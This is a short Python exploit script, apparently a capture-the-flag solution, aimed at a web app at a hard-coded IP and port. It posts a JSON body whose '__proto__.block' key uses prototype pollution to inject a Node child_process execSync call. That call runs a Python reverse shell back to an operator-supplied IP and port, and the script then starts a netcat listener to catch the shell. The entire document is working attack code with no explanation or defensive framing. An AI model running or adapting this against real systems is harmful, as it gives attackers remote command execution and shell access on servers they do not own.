import socket
import requests, os, threading

connection = '46.101.59.36:31766'

def GetShell(ip, port):
    res = requests.get(f'http://{connection}/api/submit', json={"artist.name":"Westaway","__proto__.block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{1}\",{0}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'`)".format(ip, port)}})


ip = input("Enter IP Shell :-> ")
port = input("Enter PORT Shell :-> ")
threading.Thread(target=GetShell, args=(ip, port)).start()

os.system(f"nc -lvp {port}")

